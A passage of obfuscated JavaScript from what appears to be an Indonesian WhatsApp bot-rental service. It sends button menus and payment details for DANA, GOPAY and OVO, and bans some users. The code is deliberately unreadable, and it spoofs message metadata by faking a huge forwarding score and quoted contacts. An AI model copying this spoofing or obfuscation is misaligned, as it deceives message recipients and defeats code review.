_0x27d595={};_0x27d595[_0x1f7707(0x13,0x26f,-0x92,-0x14f)]=_0x1f7707(-0x2e7,0x371,-0xe5,0x2d4)+'21',_0x27d595[_0x1f7707(0x9e9,0x784,0x52f,0x555)+'o']=_0x536154,_0x27d595['quoted']=mek,_0x27d595['sendEpheme'+_0x1f7707(0x42d,-0xad,0x118,0x2ab)]=!![],alpha[_0x1f7707(0x5,0x84,-0x232,0x246)+'e'](from,buttonMessageee,MessageType[_0x1f7707(-0x286,0x316,0x65,0x3d6)+_0x39f25f(-0x2a,-0x8d,0x289,-0x226)],_0x27d595);continue;}break;}}subscribezeeoneofc==_0x1f7707(-0x1d9,-0x478,-0x17d,-0x79)&&(console[_0x1f7707(0x602,0x4c0,0x3f1,0x235)]('\x1b[1;31m~\x1b['+_0x39f25f(0x782,0x6a2,0x36c,0x53f),'[\x1b[1;32m\x20C'+'MD\x20\x1b[1;37m'+']',wib,color(_0x1f7707(0x54b,0x56d,0x39e,0x730)+'sage\x20Tidak')),reply(_0x1f7707(0x56,0x5c0,0x4f2,0x897)+_0x39f25f(0x13c,0x579,0x2c9,0x5e4)+_0x39f25f(0x5fc,0x391,0x297,0x712)+_0x1f7707(0x828,0x56b,0x5de,0x780)),bnnpd=sender[_0x39f25f(0x418,0x3f0,0x6c5,0x488)]('@','')+('@s.whatsap'+'p.net'),banned[_0x39f25f(0x16,0x458,0x2ba,0x2b0)](bnnpd));if(subscribezeeoneofc=='ya_kak'){const mediaxpxa=await alpha[_0x1f7707(-0x172,-0x281,-0xd3,-0x323)+'sage'](from,pp_bot,MessageType[_0x1f7707(0x443,0x32b,0x327,-0xe8)],{'thumbnail':pp_bot});mhan=mediaxpxa[_0x1f7707(-0x198,-0xfe,-0x28a,-0x605)]['ephemeralM'+_0x39f25f(0x39,0x248,0x1d2,0x155)]?mediaxpxa['message'][_0x39f25f(0x61a,0x5d5,0x8ef,0x9b3)+'essage']:mediaxpxa;const _0x2ddb8e={};_0x2ddb8e[_0x1f7707(-0x30e,-0x1f9,-0x1ae,-0x2ed)+'t']=_0x39f25f(-0x208,0xf6,0x3e9,0x3d9);const _0x3f2237={};_0x3f2237['buttonId']=_0x39f25f(0x20d,0x44e,0x257,0x5b9),_0x3f2237[_0x39f25f(0x357,0x37c,0x777,0xf)]=_0x2ddb8e,_0x3f2237['type']=0x1;const buttons5=[_0x3f2237],btn5={'locationMessage':mhan['message'][_0x39f25f(0x3ed,0x9c,-0x26e,0x460)+'ssage'],'contentText':pc_sewa(_minggu,__minggu,___minggu,_bulan,_permanen,__permanen),'footerText':_0x1f7707(0x70,-0x605,-0x25a,-0x231)+_0x39f25f(0x3a1,0x2b3,-0x108,0x139)+_0x39f25f(0x8b,0x1a3,0x4b4,0x5b8)+_0x39f25f(-0xcd,0x7a,-0x3e9,-0xed)+enter+enter+botname+_0x39f25f(0x22f,-0x5d,0x163,0x133)+ownername,'buttons':buttons5,'headerType':0x6};alpha['sendMessag'+'e'](from,btn5,MessageType[_0x39f25f(0x5c3,0x213,0x40e,0x55b)+'sage'],{});}if(subscribezeeoneofc==_0x39f25f(0x7,0x44e,0x3ce,0x82c)){console[_0x1f7707(0x645,0x77d,0x3f1,0x54c)]('\x1b[1;31m~\x1b['+'1;37m>',_0x1f7707(0x890,0x93,0x4eb,0x7c2)+'MD\x20\x1b[1;37m'+']',wib,color(_0x39f25f(0x618,0x509,0x178,0x4af)+_0x1f7707(-0x130,-0x79,0x128,0x1f6)));var sewa_1='Hai\x20@'+sender[_0x39f25f(0x4fa,0x3bc,-0xa8,0x85c)]('@')[-0x16a4+-0x24e2+0x1*0x3b86]+(_0x39f25f(0x3e3,0x504,0x15a,0x4f1)+_0x1f7707(0x2f6,0xad8,0x649,0x8c3)+'ke\x20metode\x20'+_0x39f25f(0x250,-0xd1,-0x1a8,-0x88)+_0x1f7707(0x80c,0x33e,0x4d7,0x5e0)+_0x39f25f(-0x11d,0x103,0x5bc,0x56f)+'ia\x20yaitu\x20v'+_0x1f7707(0x680,0x614,0x62f,0x206)+'NA\x20&\x20GOPAY'+_0x1f7707(0x1c6,-0x44,-0x15e,-0x306)+'tode\x20lain\x20'+_0x1f7707(0x9d,-0x3c0,-0x241,0x51)+_0x1f7707(0x336,0x1fe,-0x95,-0x1ac)+_0x39f25f(0x2a4,0xab,0x38d,0x20d));const _0x58a7f4={};_0x58a7f4['displayTex'+'t']=_0x1f7707(0x2e0,0x27d,-0x10c,-0x559);const _0x546a71={};_0x546a71['buttonId']=_0x39f25f(0x76e,0x319,0x70d,-0x13f),_0x546a71['buttonText']=_0x58a7f4,_0x546a71[_0x39f25f(0x88a,0x6ce,0x811,0x478)]=0x1;const _0x450246={};_0x450246['displayTex'+'t']=_0x39f25f(0x22f,0x3c6,0x237,0x13c);const _0x5831b7={};_0x5831b7['buttonId']=_0x39f25f(0x847,0x7ac,0x87d,0x72c)+'1',_0x5831b7[_0x1f7707(-0x29e,0x1f0,0x1ce,-0xf8)]=_0x450246,_0x5831b7[_0x1f7707(0x45a,0x65b,0x520,0x528)]=0x1;const _0x149fc7={};_0x149fc7[_0x39f25f(0x35e,0x0,-0x394,-0xa1)+'t']=_0x39f25f(0xaf7,0x775,0x72c,0x609);const _0x25d059={};_0x25d059[_0x1f7707(0x36e,0x1a3,0x499,0x73e)]=_0x39f25f(0x17b,0x30c,0xf0,0x317)+'y1',_0x25d059['buttonText']=_0x149fc7,_0x25d059[_0x1f7707(0x5b0,0x476,0x520,0x23d)]=0x1;const buttons4=[_0x546a71,_0x5831b7,_0x25d059],_0x4ba78a={};_0x4ba78a[_0x39f25f(0x12,0x3d7,-0xdd,0x4a8)+'t']=sewa_1,_0x4ba78a['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x4ba78a[_0x39f25f(0x744,0x599,0x4a4,0x81e)]=buttons4,_0x4ba78a[_0x1f7707(0x5fa,0x36f,0x4b5,0x8bb)]=0x1;const btn4=_0x4ba78a,_0x574381={};_0x574381[_0x1f7707(0x5b2,-0x155,0x21e,0x13e)]='hi',_0x574381['forwarding'+_0x39f25f(0x97,0x1ae,0x2cf,0x253)]=0x3b9aca00,_0x574381['isForwarde'+'d']=!![],_0x574381[_0x1f7707(0x78f,0x42a,0x4da,0x5fd)+_0x1f7707(0x3c8,-0x3f,0x118,-0xac)]=!![],_0x574381[_0x1f7707(0x8c,0x6c0,0x491,0x21b)+'id']=[sender];const _0x46c40c={};_0x46c40c[_0x39f25f(0x32e,0x11c,0x35c,-0x286)]='Botwea\x20©2k'+'21',_0x46c40c[_0x39f25f(0x258,0x6dd,0x6d5,0x62b)+'o']=_0x574381,_0x46c40c[_0x39f25f(-0x2b3,0x106,0xd,0x61)]=fkontak,_0x46c40c[_0x39f25f(0x286,0x688,0x2d8,0x3af)+_0x1f7707(0xe1,0x3c1,0x118,0x118)]=!![],alpha[_0x39f25f(-0x24d,-0x84,-0x4e0,-0x536)+'e'](from,btn4,MessageType['buttonsMes'+_0x39f25f(0x12f,-0x8d,0x166,-0x4f0)],_0x46c40c);}if(subscribezeeoneofc==_0x39f25f(0x252,0x319,0x5a5,0x5d6)){console[_0x39f25f(0x20a,0x59f,0x7b1,0x41d)](_0x1f7707(0x32e,0x82,0x213,0xe3)+_0x39f25f(0x7e3,0x6a2,0x682,0x917),_0x1f7707(0x723,0x327,0x4eb,0x745)+_0x39f25f(0x33a,0x3d8,-0x2b,0x777)+']',wib,color(_0x1f7707(0x587,0x3d9,0x39e,0x316)+_0x1f7707(0x481,-0x205,0xc0,-0x3a3)+_0x39f25f(0x3b4,0x1fd,0x398,-0x149)));var ini_info=_0x39f25f(0xaa5,0x6a3,0x558,0x20f)+sender[_0x1f7707(-0x195,0x35a,0x20e,0x47c)]('@')[-0x10dc+-0x1c6c*-0x1+0x4a*-0x28]+(_0x1f7707(0x782,0x5ec,0x54d,0x6f2)+_0x39f25f(0x186,-0x4a,0x285,-0x294)+_0x39f25f(-0x17f,-0x60,0x11f,-0x141)+'a\x20atau\x20pak'+_0x1f7707(0x501,0x2dc,0x46c,0x428));const _0x112ead={};_0x112ead[_0x39f25f(-0x1fc,0x0,0x61,-0x39f)+'t']=_0x39f25f(0x4d5,0x6d2,0x82a,0x800);const _0x4833b6={};_0x4833b6['buttonId']=_0x39f25f(0x1b2,-0x4b,0x2e5,0x136)+_0x1f7707(0x3b4,0x55f,0x3a2,0x27a),_0x4833b6[_0x39f25f(-0x25,0x37c,0x5f6,0x797)]=_0x112ead,_0x4833b6[_0x39f25f(0xa54,0x6ce,0x824,0x9d9)]=0x1;const _0xdfbaf9={};_0xdfbaf9[_0x1f7707(-0x519,0x1e6,-0x1ae,-0x4e1)+'t']='📠\x20Qr\x20Code';const _0x2722c1={};_0x2722c1[_0x1f7707(0x2a3,0x4bb,0x499,0x2f7)]=_0x39f25f(0xa02,0x597,0x5db,0x7ba),_0x2722c1[_0x39f25f(0x327,0x37c,0x312,0x651)]=_0xdfbaf9,_0x2722c1['type']=0x1;const buttons6=[_0x4833b6,_0x2722c1],_0x27351c={};_0x27351c['contentTex'+'t']=ini_info,_0x27351c[_0x39f25f(0x741,0x7e5,0x9b3,0xbb6)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x27351c['buttons']=buttons6,_0x27351c[_0x39f25f(0xa55,0x663,0x20f,0x678)]=0x1;const btn6=_0x27351c,_0x10aab2={};_0x10aab2[_0x1f7707(-0x86,0x18e,0x21e,0x433)]='hi',_0x10aab2[_0x1f7707(0x800,0x6a1,0x50c,0x738)+_0x39f25f(0x1ed,0x1ae,-0x20f,0xc8)]=0x3b9aca00,_0x10aab2[_0x39f25f(-0x27a,0x5d,0x363,-0x43c)+'d']=!![],_0x10aab2[_0x1f7707(0x450,0x34e,0x4da,0x75)+_0x39f25f(0x639,0x2c6,0x31,0x4dd)]=!![],_0x10aab2['mentionedJ'+'id']=[sender];const _0x4924fc={};_0x4924fc[_0x39f25f(0x1b5,0x11c,0x129,-0x1d2)]=_0x1f7707(-0x46d,-0x8d,-0xe5,-0x183)+'21',_0x4924fc[_0x39f25f(0x279,0x6dd,0x331,0xa40)+'o']=_0x10aab2,_0x4924fc[_0x1f7707(0x35c,-0x411,-0xa8,0x28c)]=fkontak,_0x4924fc[_0x1f7707(0x83b,0xf0,0x4da,0x6bc)+_0x1f7707(0x4f7,0x422,0x118,0x28e)]=!![],alpha[_0x39f25f(0x175,-0x84,-0x2e2,0x3dc)+'e'](from,btn6,MessageType[_0x1f7707(-0x395,-0xda,0x65,-0xab)+_0x39f25f(0x2a6,-0x8d,-0x2d6,0xa7)],_0x4924fc);}if(subscribezeeoneofc=='bayar_dana'+'1'){console[_0x1f7707(0x3f3,0x530,0x3f1,-0x45)](_0x39f25f(0x2a5,0x3c1,0x89,0x757)+_0x1f7707(0x70e,0x230,0x4f4,0x61e),_0x39f25f(0x49c,0x699,0x525,0xb22)+_0x1f7707(0x3f4,-0x1f2,0x22a,0x44c)+']',wib,color(_0x1f7707(0x572,0x798,0x39e,0x226)+_0x39f25f(0x53,0x26e,0x5dd,0x6a2)+'nt\x20Dana'));var ini_info=_0x1f7707(0x788,0x396,0x4f5,0x7d9)+sender['split']('@')[-0x187f+0x428+0x1457]+(_0x39f25f(0x4d1,0x6fb,0x60b,0xb0a)+_0x39f25f(0x225,-0x4a,0x2e,-0xdb)+_0x1f7707(-0x3f8,0x26c,-0x20e,-0x315)+_0x1f7707(0x292,0xa11,0x57d,0x972)+_0x1f7707(0x355,0x18e,0x46c,0x45f));const _0x4574f6={};_0x4574f6[_0x1f7707(-0x552,-0x601,-0x1ae,0x169)+'t']=_0x1f7707(0x51d,0x6d1,0x524,0xb0);const _0xd0518b={};_0xd0518b[_0x39f25f(0x51f,0x647,0x83b,0x9b1)]='langsung_d'+_0x39f25f(-0x1ba,-0x5b,-0x4d1,0x202),_0xd0518b[_0x39f25f(-0xf6,0x37c,0x761,0x827)]=_0x4574f6,_0xd0518b[_0x39f25f(0x53d,0x6ce,0x29c,0x630)]=0x1;const _0x536c17={};_0x536c17[_0x39f25f(0x2bf,0x0,-0x142,-0x33d)+'t']='📠\x20Qr\x20Code';const _0x4e7d32={};_0x4e7d32[_0x1f7707(0xcc,0x593,0x499,0x494)]='qr_dana13',_0x4e7d32['buttonText']=_0x536c17,_0x4e7d32[_0x39f25f(0x76d,0x6ce,0x82d,0x277)]=0x1;const buttons6=[_0xd0518b,_0x4e7d32],_0x40f482={};_0x40f482[_0x1f7707(-0xe5,0x4c7,0x229,-0x1fe)+'t']=ini_info,_0x40f482[_0x39f25f(0x698,0x7e5,0x5d1,0xc7e)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x40f482['buttons']=buttons6,_0x40f482[_0x39f25f(0x2a1,0x663,0x69a,0x24e)]=0x1;const btn6=_0x40f482,_0x21063f={};_0x21063f[_0x39f25f(0x217,0x3cc,0x3e,0x6d2)]='hi',_0x21063f[_0x39f25f(0x630,0x6ba,0x403,0x2bf)+_0x1f7707(0x82,-0x14f,0x0,0x1a7)]=0x3b9aca00,_0x21063f[_0x1f7707(0x218,0x130,-0x151,-0x52d)+'d']=!![],_0x21063f[_0x39f25f(0x3c9,0x688,0x517,0xaf7)+_0x1f7707(0x2cb,-0x174,0x118,0xfc)]=!![],_0x21063f[_0x39f25f(0x19f,0x63f,0x751,0x81c)+'id']=[sender];const _0x28145d={};_0x28145d['caption']=_0x39f25f(0x1a3,0xc9,0x42f,0x438)+'21',_0x28145d[_0x1f7707(0x3f6,0x6e9,0x52f,0x1c5)+'o']=_0x21063f,_0x28145d[_0x39f25f(-0x317,0x106,-0x38f,-0x34a)]=fkontak,_0x28145d[_0x39f25f(0x99f,0x688,0x75a,0x6aa)+'ral']=!![],alpha['sendMessag'+'e'](from,btn6,MessageType['buttonsMes'+_0x1f7707(-0x2f7,0x138,-0x23b,0x204)],_0x28145d);}if(subscribezeeoneofc==_0x1f7707(-0x22a,0x221,0x15e,-0x34)+'y1'){console[_0x39f25f(0x48c,0x59f,0x290,0x785)](_0x1f7707(0xea,0x43a,0x213,0x49a)+_0x39f25f(0x81e,0x6a2,0x2ec,0x8ae),'[\x1b[1;32m\x20C'+_0x1f7707(-0x1ef,0x6cd,0x22a,0x3a7)+']',wib,color(_0x39f25f(0x5e2,0x54c,0x538,0x405)+'sage\x20Payme'+_0x39f25f(0x6de,0x5f2,0x33d,0x4b5)));var ini_info='Hay\x20@'+sender[_0x1f7707(0x641,-0x14c,0x20e,-0x1cd)]('@')[0x4d3+-0x5b*-0x35+-0x1*0x17aa]+(',\x20kamu\x20mau'+_0x39f25f(0x35,-0x4a,-0x4d7,-0x3a1)+_0x39f25f(-0x32b,-0x60,-0x245,-0xa6)+'a\x20atau\x20pak'+_0x39f25f(0x9ef,0x61a,0x9c4,0x70d));const _0x4ef586={};_0x4ef586[_0x39f25f(0x7c,0x0,-0x26d,-0x33d)+'t']=_0x39f25f(0x824,0x6d2,0x9e4,0x6a6);const _0x36bfa6={};_0x36bfa6['buttonId']=_0x39f25f(0x5c7,0x18e,0x209,-0x103)+'opay13',_0x36bfa6['buttonText']=_0x4ef586,_0x36bfa6['type']=0x1;const _0x25cff6={};_0x25cff6[_0x1f7707(-0x37,-0x167,-0x1ae,-0x52c)+'t']=_0x1f7707(0x3e7,0xaab,0x650,0x25c);const _0x13652f={};_0x13652f[_0x39f25f(0x867,0x647,0xa7c,0x291)]=_0x39f25f(0x24a,0x5e2,0x960,0x380),_0x13652f['buttonText']=_0x25cff6,_0x13652f[_0x1f7707(0x660,0x89e,0x520,0x2c0)]=0x1;const buttons6=[_0x36bfa6,_0x13652f],_0x467d15={};_0x467d15[_0x1f7707(0x6df,0x57d,0x229,-0x71)+'t']=ini_info,_0x467d15[_0x1f7707(0x57a,0x814,0x637,0x4a0)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x467d15[_0x1f7707(0x404,0x419,0x3eb,-0x7a)]=buttons6,_0x467d15[_0x39f25f(0x248,0x663,0x6ac,0x721)]=0x1;const btn6=_0x467d15,_0x9c3663={};_0x9c3663[_0x39f25f(0x62d,0x3cc,0x1a9,0x526)]='hi',_0x9c3663['forwarding'+'Score']=0x3b9aca00,_0x9c3663['isForwarde'+'d']=!![],_0x9c3663['sendEpheme'+_0x1f7707(-0x62,-0x66,0x118,-0x297)]=!![],_0x9c3663['mentionedJ'+'id']=[sender];const _0xae6121={};_0xae6121[_0x39f25f(0x165,0x11c,0xbc,-0x1bc)]=_0x39f25f(0x463,0xc9,0x547,-0x2dd)+'21',_0xae6121[_0x1f7707(0x635,0x973,0x52f,0x6e4)+'o']=_0x9c3663,_0xae6121['quoted']=fkontak,_0xae6121[_0x1f7707(0x59a,0x59f,0x4da,0x411)+_0x1f7707(-0x386,0x1a7,0x118,0x1f0)]=!![],alpha[_0x39f25f(0xe0,-0x84,-0xa4,-0x124)+'e'](from,btn6,MessageType[_0x1f7707(0x20e,-0x242,0x65,0x2e)+'sage'],_0xae6121);}if(subscribezeeoneofc==_0x39f25f(0x5c,-0x4b,-0x301,0x2f8)+'vo13'){console['log'](_0x1f7707(0xf7,0x684,0x213,0x31)+_0x1f7707(0x43f,0x8a6,0x4f4,0x8c0),_0x1f7707(0x20e,0x355,0x4eb,0x625)+_0x1f7707(0x537,0x252,0x22a,-0xbb)+']',wib,color('Button\x20Mes'+_0x39f25f(0x778,0x6ab,0x87e,0x2c0)+_0x1f7707(0x3b9,0x6a4,0x3a4,0x24a))),optionsp1=petik+('JASA\x20SEWA\x20'+_0x39f25f(0xb0a,0x735,0x2d8,0x7db))+petik+(_0x1f7707(-0x577,0x15f,-0x211,-0x623)+_0x1f7707(-0x204,0x4ec,0x294,0x80))+pushname+(_0x39f25f(0x2cd,-0x8b,0x3d6,0x312)+'\x20:\x20_@')+sender[_0x39f25f(-0xec,0x3bc,0x819,0x6c6)]('@')[-0x1*0x12be+0x64a*0x2+0x62a]+_0x39f25f(0x27,0x64,-0x1b1,0x45f)+petik+(_0x1f7707(0x197,-0x5f9,-0x1e5,-0x515)+'O')+petik+'\x0a\x0a'+nomor_ovo+('\x0a\x0a_Powered'+_0x39f25f(0x327,0x2a0,-0x7,0x57a))+ini_mark[_0x39f25f(0x1c9,0x3bc,0x77a,0x531)]('@')[0x7f*-0x1f+-0x65f*-0x5+0x107a*-0x1]+'_';const _0x22e4f4={};_0x22e4f4[_0x39f25f(0x764,0x63f,0x6c0,0x5d1)+'id']=[sender,ini_mark],_0x22e4f4[_0x39f25f(0x83b,0x6ba,0x4e5,0x24c)+_0x1f7707(0x91,-0x3bc,0x0,0xa8)]=0x3e7,_0x22e4f4[_0x39f25f(0x3d9,0x5d,-0x181,0x42c)+'d']=!![];const _0xd5ed08={};_0xd5ed08['quoted']=fkontak,_0xd5ed08['contextInf'+'o']=_0x22e4f4,_0xd5ed08[_0x39f25f(0x5b6,0x688,0x303,0x48b)+_0x39f25f(0x160,0x2c6,-0x126,-0x1be)]=!![],alpha[_0x1f7707(0x209,-0xe6,-0x232,0x62)+'e'](from,optionsp1,text,_0xd5ed08);}if(subscribezeeoneofc==_0x39f25f(-0x428,-0x9f,0x1dd,-0x231)+'ana13'){console[_0x39f25f(0x21a,0x59f,0x933,0x556)](_0x39f25f(0x4fc,0x3c1,0x55f,0x6d1)+'1;37m>',_0x1f7707(0x6f0,0x5e8,0x4eb,0x48d)+_0x39f25f(0x2b8,0x3d8,0x5c8,0x276)+']',wib,color(_0x1f7707(0x2c4,0x415,0x39e,0x7b3)+_0x1f7707(0x39c,0x7cb,0x4fd,0x999)+_0x1f7707(-0x12e,0xf3,0x338,0x36e))),optionsp1=petik+(_0x39f25f(0x4bf,0x462,0x733,0x3af)+_0x1f7707(0x1fa,0x919,0x587,0x337))+petik+(_0x1f7707(0xcc,-0x1ed,-0x211,-0x132)+_0x1f7707(0x376,0x59f,0x294,0x547))+pushname+(_0x39f25f(0x4a,-0x8b,0x23c,-0x477)+_0x1f7707(0x7d,0xf,0x15,-0x37e))+sender[_0x1f7707(0x1b5,0x4f1,0x20e,-0x8)]('@')[-0x22af+-0x21d9+-0x102*-0x44]+_0x1f7707(-0x3b6,-0x236,-0x14a,0x36d)+petik+(_0x39f25f(0x29f,-0xbf,-0x4cf,-0x1e5)+'NA')+petik+'\x0a\x0a'+nomor_dana+('\x0a\x0a_Powered'+_0x39f25f(-0x153,0x2a0,0x64a,0x1af))+ini_mark['split']('@')[0x4*-0x52f+-0x1e31*0x1+0x32ed]+'_';const _0x121e7d={};_0x121e7d[_0x1f7707(0x5a7,0x3e1,0x491,0x7aa)+'id']=[sender,ini_mark],_0x121e7d[_0x1f7707(0x86d,0x2f3,0x50c,0x8b0)+_0x39f25f(0x10b,0x1ae,0x56a,-0xfc)]=0x3e7,_0x121e7d['isForwarde'+'d']=!![];const _0x3796ae={};_0x3796ae[_0x1f7707(-0x309,0x5f,-0xa8,0x221)]=fkontak,_0x3796ae[_0x1f7707(0x39e,0x3c1,0x52f,0x440)+'o']=_0x121e7d,_0x3796ae['sendEpheme'+'ral']=!![],alpha[_0x1f7707(-0x515,-0x499,-0x232,-0x14)+'e'](from,optionsp1,text,_0x3796ae);}if(subscribezeeoneofc==_0x1f7707(-0x8f,0x20c,-0x20,0x47d)+_0x1f7707(-0x5ae,-0xbd,-0x140,0x1fe)){console[_0x39f25f(0x9ff,0x59f,0x554,0x8a5)](_0x39f25f(0x16f,0x3c1,0x7ba,0x5c0)+_0x39f25f(0x59c,0x6a2,0x436,0x244),'[\x1b[1;32m\x20C'+'MD\x20\x1b[1;37m'+']',wib,color(_0x39f25f(0x177,0x54c,0x54a,0x86f)+_0x39f25f(0x810,0x6ab,0x929,0x65e)+'\x20Gopay')),optionsp1=petik+('JASA\x20SEWA\x20'+'BOT')+petik+(_0x1f7707(-0x309,-0x21f,-0x211,-0x29c)+':\x20_')+pushname+(_0x1f7707(0x1c,-0x4b9,-0x239,0x22c)+_0x1f7707(-0x316,-0x38e,0x15,-0x2a7))+sender[_0x39f25f(0x856,0x3bc,0x6fc,-0xb8)]('@')[-0x27*-0x26+-0x8b9*-0x1+0xe83*-0x1]+_0x39f25f(0x4c6,0x64,-0x1bd,0x18e)+petik+('PAYMENT\x20GO'+_0x39f25f(0x21,-0x121,0x312,-0x4aa))+petik+'\x0a\x0a'+nomor_gopay+(_0x1f7707(0x1f5,0x458,0x475,0x109)+'\x20by\x20@')+ini_mark['split']('@')[-0x1*0x965+-0x417*-0x3+-0x170*0x2]+'_';const _0x4a2d56={};_0x4a2d56[_0x1f7707(0x903,0x50b,0x491,0x59)+'id']=[sender,ini_mark],_0x4a2d56['forwarding'+_0x39f25f(-0xb7,0x1ae,0x5d7,0x1e0)]=0x3e7,_0x4a2d56['isForwarde'+'d']=!![];const _0x17bc49={};_0x17bc49[_0x39f25f(0xe4,0x106,0x126,0x21f)]=fkontak,_0x17bc49[_0x39f25f(0xa50,0x6dd,0x6fe,0x545)+'o']=_0x4a2d56,_0x17bc49[_0x39f25f(0x5b8,0x688,0x43d,0xaaf)+_0x1f7707(-0x193,-0xd2,0x118,0x376)]=!![],alpha[_0x1f7707(-0x4a,0x234,-0x232,-0x1bb)+'e'](from,optionsp1,text,_0x17bc49);}if(subscribezeeoneofc==_0x1f7707(-0x147,0x575,0x367,0x6f8)){var ini_info=_0x1f7707(0x4a0,0x366,0x4f5,0x90a)+sender[_0x39f25f(0x395,0x3bc,0x3eb,-0xc3)]('@')[-0x825*-0x2+0x692*0x2+0x1d6e*-0x1]+(_0x39f25f(0x29b,0x6fb,0x902,0x8d7)+_0x39f25f(0x6a9,0x753,0xc00,0x2a1)+_0x39f25f(0x5ce,0x5e8,0x344,0x840)+_0x39f25f(0x3ef,0x50b,0x542,0x51b)+'\x20,\x20atau\x20GO'+_0x39f25f(0x4af,0x300,0x690,0x376)+_0x39f25f(0x7e6,0x753,0x501,0x9f7)+'a\x20pulsa\x20bi'+'sa\x20hubungi'+_0x39f25f(0x5e0,0x5f0,0x66a,0x34e)+_0x1f7707(-0x46,-0x44,0x15c,0x2fe));const _0x4276b8={};_0x4276b8[_0x39f25f(-0x394,0x0,-0xd3,0x313)+'t']=_0x39f25f(0x31c,0x186,-0x198,-0x32c);const _0x4b5235={};_0x4b5235[_0x39f25f(0x5f3,0x647,0x775,0x33f)]=_0x39f25f(-0x140,0x319,0x164,0x69c)+'8',_0x4b5235[_0x1f7707(0x1d4,0x3c9,0x1ce,0x4c1)]=_0x4276b8,_0x4b5235['type']=0x1;const _0x3a2083={};_0x3a2083['displayTex'+'t']=_0x1f7707(0x43a,-0x218,0x2a,-0x13a);const _0x2a2688={};_0x2a2688['buttonId']='bayar_dana'+'18',_0x2a2688['buttonText']=_0x3a2083,_0x2a2688[_0x39f25f(0xb0a,0x6ce,0x901,0x5c3)]=0x1;const _0xeeac2f={};_0xeeac2f[_0x39f25f(-0x3af,0x0,0x175,-0x11a)+'t']=_0x39f25f(0x7cb,0x5c0,0x73f,0xa2c);const _0x36a193={};_0x36a193[_0x1f7707(0x73a,0x7a6,0x499,0x7bd)]=_0x1f7707(-0x2c0,0x1b8,0x15e,-0x2d3)+_0x1f7707(0x7fa,0x4ac,0x4df,0x3b4),_0x36a193[_0x1f7707(0x75,0x403,0x1ce,0x363)]=_0xeeac2f,_0x36a193['type']=0x1;const buttons3=[_0x4b5235,_0x2a2688,_0x36a193],_0x44963d={};_0x44963d[_0x1f7707(0x614,0x22b,0x229,0x644)+'t']=ini_info,_0x44963d[_0x39f25f(0x4f6,0x7e5,0xc6b,0x61e)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x44963d[_0x39f25f(0x949,0x599,0x414,0xa36)]=buttons3,_0x44963d[_0x39f25f(0x20b,0x663,0xafd,0x483)]=0x1;const btn3=_0x44963d,_0x1739e4={};_0x1739e4[_0x39f25f(0x404,0x3cc,0x65,-0xdd)]='hi',_0x1739e4[_0x1f7707(0x297,0x477,0x50c,0x6ae)+_0x39f25f(-0xd2,0x1ae,0x346,0x374)]=0x3b9aca00,_0x1739e4[_0x39f25f(0x141,0x5d,-0x30,-0x35f)+'d']=!![],_0x1739e4[_0x1f7707(0x384,0x4ed,0x4da,0x637)+'ral']=!![],_0x1739e4['mentionedJ'+'id']=[sender];const _0x279981={};_0x279981['caption']=_0x39f25f(0x14a,0xc9,0x486,0x21)+'21',_0x279981['contextInf'+'o']=_0x1739e4,_0x279981[_0x1f7707(0x30b,0x2ba,-0xa8,0x2c9)]=ftroli,_0x279981[_0x39f25f(0x278,0x688,0x5b0,0x29c)+_0x39f25f(0x44f,0x2c6,0x3ed,0x5de)]=!![],alpha[_0x1f7707(0x25,-0x428,-0x232,-0x2cb)+'e'](from,btn3,MessageType[_0x39f25f(0x30,0x213,-0x5e,0x220)+_0x39f25f(0x37f,-0x8d,-0x26e,-0x191)],_0x279981);}function _0x1f7707(_0x3f1f33,_0x2d0402,_0x2f0db2,_0x12299c){return _0x3a08(_0x2f0db2- -0x3c8,_0x2d0402);}if(subscribezeeoneofc==_0x1f7707(0xb2,0x381,0x16b,0x51e)+'8'){var ini_info=_0x1f7707(0x482,0x2d3,0x4f5,0x93d)+sender['split']('@')[-0x1610+-0x23be+-0x421*-0xe]+(_0x39f25f(0xb5a,0x6fb,0x587,0x835)+_0x1f7707(-0x530,-0x452,-0x1f8,-0x532)+_0x39f25f(-0x3fd,-0x60,-0x14c,0x42e)+_0x1f7707(0x425,0xa11,0x57d,0x1aa)+_0x39f25f(0xa79,0x61a,0x999,0x9fa));const _0x546d4c={};_0x546d4c['displayTex'+'t']=_0x1f7707(0x189,0x2a6,0x1c1,0x2c1);const _0x496176={};_0x496176['buttonId']=_0x1f7707(-0x560,-0x46f,-0x1f9,-0x5f)+_0x1f7707(0x332,0x6e2,0x326,0x3ed),_0x496176[_0x1f7707(-0xd9,0x3c5,0x1ce,0x635)]=_0x546d4c,_0x496176['type']=0x1;const _0x1ae9ff={};_0x1ae9ff[_0x39f25f(-0x3d6,0x0,0x3d7,0x1c9)+'t']=_0x39f25f(0x373,0x5fa,0x853,0xa2e);const _0x55d00c={};_0x55d00c['buttonId']=_0x1f7707(0x2c1,0x84c,0x481,0x2de),_0x55d00c['buttonText']=_0x1ae9ff,_0x55d00c['type']=0x1;const buttons4=[_0x496176,_0x55d00c],_0x4e1672={};_0x4e1672[_0x39f25f(0x2b7,0x3d7,0x215,0x847)+'t']=ini_info,_0x4e1672['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x4e1672['buttons']=buttons4,_0x4e1672[_0x1f7707(0x755,0x27c,0x4b5,0x1c1)]=0x1;const btn4=_0x4e1672,_0x3975ad={};_0x3975ad[_0x1f7707(0x5dd,0x5ea,0x21e,0x10d)]='hi',_0x3975ad['forwarding'+'Score']=0x3b9aca00,_0x3975ad['isForwarde'+'d']=!![],_0x3975ad[_0x1f7707(0x3cb,0x11e,0x4da,0x84f)+'ral']=!![],_0x3975ad['mentionedJ'+'id']=[sender];const 